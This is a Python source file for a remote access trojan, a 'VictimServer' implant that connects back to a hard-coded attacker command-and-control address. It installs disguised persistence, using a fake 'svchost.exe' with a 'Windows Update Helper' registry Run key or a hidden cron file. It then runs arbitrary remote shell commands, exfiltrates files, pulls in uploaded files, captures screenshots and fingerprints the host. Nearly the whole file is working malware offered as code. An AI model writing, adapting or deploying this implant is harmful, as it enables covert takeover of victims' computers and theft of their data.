import socket
import subprocess
import os
import sys
import json
import time
import platform
import shutil
import threading
import hashlib
from pathlib import Path
import zlib
from PIL import ImageGrab

# Configuration
C2_HOST = '192.168.100.15'  # Attacker C2 IP
C2_PORT = 443
RECONNECT_INTERVAL = 10
MAX_FILE_CHUNK = 4096 * 16
SCREENSHOT_QUALITY = 70
HEARTBEAT_INTERVAL = 30


class VictimServer:
    def __init__(self):
        self.sock = None
        self.platform = platform.system()
        self.session_id = hashlib.sha256(os.urandom(16)).hexdigest()
        self.lock = threading.Lock()
        self.persist()
        self.running = True
        self.command_map = {
            'CMD': self.handle_command,
            'DL': self.handle_download,
            'UL': self.handle_upload,
            'SCREENSHOT': self.handle_screenshot,
            'PERSIST': self.handle_persist,
            'STEALTH': self.handle_stealth,
            'KILL': self.handle_kill,
            'PING': self.handle_ping
        }

    def persist(self):
        """Cross-platform persistence"""
        try:
            if self.platform == 'Windows':
                exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
                if not os.path.exists(exe_path):
                    shutil.copy2(sys.argv[0], exe_path)
                    subprocess.check_call(
                        f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        f'/v "Windows Update Helper" /t REG_SZ /d "{exe_path}" /f',
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
            elif self.platform == 'Linux':
                cron_path = '/etc/cron.d/.systemd'
                if not os.path.exists(cron_path):
                    with open(cron_path, 'w') as f:
                        f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
                    os.chmod(cron_path, 0o644)
        except Exception as e:
            pass

    def connect_c2(self):
        """Secure connection handler with retries"""
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.sock.connect((C2_HOST, C2_PORT))
                self._safe_send(self.session_id.encode())
                self.send_system_info()
                return True
            except Exception as e:
                time.sleep(RECONNECT_INTERVAL)

    def send_system_info(self):
        """Send system fingerprint with protocol framing"""
        info = {
            'id': self.session_id,
            'os': self.platform,
            'hostname': platform.node(),
            'user': os.getenv('USERNAME') or os.getenv('USER'),
            'privilege': 'admin' if os.getuid() == 0 else 'user'
        }
        self._safe_send(json.dumps(info).encode())

    def receive_commands(self):
        """Main command loop with protocol handling"""
        while self.running:
            try:
                command = self._safe_recv()
                if not command:
                    continue

                cmd_type = command.split()[0] if ' ' in command else command
                handler = self.command_map.get(cmd_type, self.handle_unknown)
                threading.Thread(target=handler, args=(command,)).start()

            except Exception as e:
                if self.running:
                    self.connect_c2()

    def handle_command(self, command):
        """Execute system command"""
        try:
            cmd = command.split(' ', 1)[1]
            result = subprocess.run(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=30
            )
            output = result.stdout or result.stderr
            self._safe_send(output)
        except Exception as e:
            self._safe_send(f"Command error: {str(e)}".encode())

    def handle_download(self, command):
        """Handle file download requests"""
        try:
            file_path = command.split(' ', 1)[1]
            self.send_file(file_path)
        except IndexError:
            self._safe_send(b"Invalid download command")

    def handle_upload(self, command):
        """Handle file upload requests"""
        try:
            file_path = command.split(' ', 1)[1]
            self.receive_file(file_path)
        except IndexError:
            self._safe_send(b"Invalid upload command")

    def handle_screenshot(self, _):
        """Capture and send screenshot"""
        try:
            filename = f"screenshot_{int(time.time())}.jpg"
            img = ImageGrab.grab()
            img.save(filename, quality=SCREENSHOT_QUALITY)
            self.send_file(filename)
            os.remove(filename)
        except Exception as e:
            self._safe_send(f"Screenshot error: {str(e)}".encode())

    def handle_persist(self, command):
        """Handle persistence methods"""
        self.persist()
        self._safe_send(b"Persistence installed")

    def handle_stealth(self, command):
        """Toggle stealth mode (placeholder)"""
        self._safe_send(b"Stealth mode toggled")

    def handle_kill(self, _):
        """Self-destruct sequence"""
        self.self_destruct()
        self._safe_send(b"Kill command received")
        self.running = False

    def handle_ping(self, _):
        """Handle heartbeat requests"""
        self._safe_send(b"PONG")

    def handle_unknown(self, command):
        """Handle unrecognized commands"""
        self._safe_send(b"Unknown command")

    def send_file(self, file_path):
        """Secure file transfer with protocol"""
        try:
            if not os.path.exists(file_path):
                self._safe_send(b"File not found")
                return

            # Send metadata
            file_hash = self._calculate_hash(file_path)
            metadata = json.dumps({
                'name': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'hash': file_hash
            })
            self._safe_send(metadata.encode())

            # Wait for ACK
            if self._safe_recv() != b"ACK":
                return

            # Send compressed file data
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(MAX_FILE_CHUNK)
                    if not chunk:
                        break
                    compressed = zlib.compress(chunk)
                    self._safe_send(compressed)

            # Verify transfer
            if self._safe_recv() == b"VER":
                self._safe_send(file_hash.encode())

        except Exception as e:
            self._safe_send(f"File error: {str(e)}".encode())

    def receive_file(self, file_path):
        """Secure file reception with protocol"""
        try:
            metadata = json.loads(self._safe_recv().decode())
            self._safe_send(b"ACK")

            received = 0
            file_hash = hashlib.sha256()
            with open(file_path, 'wb') as f:
                while received < metadata['size']:
                    data = zlib.decompress(self._safe_recv())
                    f.write(data)
                    file_hash.update(data)
                    received += len(data)

            # Verify hash
            if file_hash.hexdigest() == metadata['hash']:
                self._safe_send(b"File upload successful")
            else:
                os.remove(file_path)
                self._safe_send(b"File hash mismatch")

        except Exception as e:
            self._safe_send(f"Upload error: {str(e)}".encode())

    def _safe_send(self, data):
        """Protocol-compliant send with length prefix"""
        with self.lock:
            try:
                if isinstance(data, str):
                    data = data.encode()
                self.sock.sendall(len(data).to_bytes(4, 'big') + data)
            except Exception as e:
                if self.running:
                    self.connect_c2()

    def _safe_recv(self):
        """Protocol-compliant receive with length prefix"""
        try:
            raw_len = self.sock.recv(4)
            if not raw_len:
                return None
            msg_len = int.from_bytes(raw_len, 'big')
            data = bytearray()
            while len(data) < msg_len:
                packet = self.sock.recv(min(4096, msg_len - len(data)))
                if not packet:
                    return None
                data.extend(packet)
            return bytes(data)
        except Exception as e:
            return None

    def _calculate_hash(self, path):
        """Calculate SHA-256 file hash"""
        sha = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sha.update(chunk)
        return sha.hexdigest()

    def self_destruct(self):
        """Cleanup and removal"""
        try:
            if self.platform == 'Windows':
                subprocess.run(
                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    '/v "Windows Update Helper" /f',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                os.remove(os.path.join(os.getenv('APPDATA'), 'svchost.exe'))
            elif self.platform == 'Linux':
                os.remove('/etc/cron.d/.systemd')
        finally:
            sys.exit(0)

    def start(self):
        """Main execution loop"""
        while self.running:
            try:
                if self.connect_c2():
                    self.receive_commands()
            except Exception as e:
                time.sleep(RECONNECT_INTERVAL)


if __name__ == '__main__':
    server = VictimServer()
    server.start()